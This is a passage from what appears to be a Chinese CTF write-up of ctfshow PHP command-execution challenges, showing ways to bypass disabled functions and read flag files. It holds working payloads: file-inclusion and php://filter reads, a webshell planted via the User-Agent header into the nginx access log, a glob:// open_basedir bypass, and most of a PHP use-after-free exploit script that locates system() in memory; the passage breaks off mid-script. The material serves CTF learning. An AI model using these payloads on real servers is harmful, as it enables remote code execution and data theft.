class="line">&#125;</span><br></pre></td></tr></table></figure>题目描述变成突破禁用函数，常规思路是查看phpinfo()看具体禁用了哪些函数，但发现phpinfo也被禁用了，再经过尝试发现禁用了`system()`、`echo shell_exec()`、`renmae`尝试到`file_get_contents()`未被禁用，猜测flag在`flag.php`中或可以使用函数查看目录`c=print_r(scandir("."));`payload:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=echo file_get_contents(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>在59题中，源码未变，但过滤的肯定更多，测试发现`file_get_contents()`果然被禁用我们还可以使用`include`<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=include($_GET[1]);</span><br><span class="line">?1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>思路还有很多很多，`c=highlight_file("flag.php");`    `c=show_source('flag.php');`  `c=include('flag.php');echo $flag;`    `c=include('flag.php');var_dump(get_defined_vars());`> flag不一定在flag.php中，可以用c=print_r(scandir("."));遍历目录寻找flag位置**一种无法命令执行时写shell的方式**更改UA头为：`<?php eval($_POST[a]); ?>`将木马写入日志里<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?1=/var/log/nginx/access.log</span><br><span class="line">c=include($_GET[1]);&amp;a=</span><br></pre></td></tr></table></figure><h2 id="68-70-web68-70">68-70.web68-70</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，突破禁用函数，求你们别秀了</strong></p><h3 id="解题思路">解题思路</h3><p>打开题目显示</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">highlight_file</span>() has been disabled <span class="keyword">for</span> security reasons in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">19</span></span><br></pre></td></tr></table></figure><p>很明显最常用的<code>highlight_file()</code>函数已经被禁用<br>根据上题经验，尝试参数c传参<br>查看目录函数和文件包含仍可使用<br>payload：<code>c=include('/flag.txt');</code></p><h2 id="71-web71">71.web71</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，突破禁用函数，求你们别秀了</strong></p><h3 id="解题思路">解题思路</h3><p>附件中给出了php源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure><p>其中先把缓存区内容读取到s中，清空缓存区，再将s中数字字母替换为？输出<br>导致报错及有用信息不可见<br>我们执行<code>eval()</code>函数后退出即可<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h2 id="72-web72">72.web72</h2><h3 id="题目描述">题目描述</h3><p><strong>命令执行，突破禁用函数，求你们别秀了</strong></p><h3 id="解题思路">解题思路</h3><p>源代码和上题一样，利用上题payload白嫖发现include找不到文件<br>包含当前文件下的<strong>flag.php</strong>并输出flag试试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);<span class="keyword">echo</span> <span class="variable">$flag</span>;<span class="keyword">exit</span>();</span><br><span class="line"><span class="comment"># 秀秀得了,这次不在这里</span></span><br></pre></td></tr></table></figure><p>判断又更改了flag位置<br>利用常用的<code>scandir()</code>函数读取目录发现报错</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Warning: <span class="title function_ invoke__">scandir</span>(): open_basedir restriction in effect. <span class="title function_ invoke__">File</span>(/) is not within the allowed <span class="title function_ invoke__">path</span>(s): (/<span class="keyword">var</span>/www/html/) in /<span class="keyword">var</span>/www/html/index.<span class="title function_ invoke__">php</span>(<span class="number">19</span>) : <span class="keyword">eval</span>()<span class="string">&#x27;d code on line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Warning: scandir(/): failed to open dir: Operation not permitted in /var/www/html/index.php(19) : eval()&#x27;</span>d code on line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">scandir</span>(): (errno <span class="number">1</span>): Operation not permitted in /<span class="keyword">var</span>/www/html/index.<span class="title function_ invoke__">php</span>(<span class="number">19</span>) : <span class="keyword">eval</span>()<span class="string">&#x27;d code on line 1</span></span><br></pre></td></tr></table></figure><p>原因是open_basedir限制<br>利用glob协议目录读取脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flag0.txt home lib media mnt opt proc root run sbin srv sys tmp usr var</span></span><br></pre></td></tr></table></figure><p>可以看到flag应该就在flag0.txt中<br>尝试<code>include()</code>发现仍然被open_basedir限制，使用uaf脚本绕过**(原理未知)**</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ 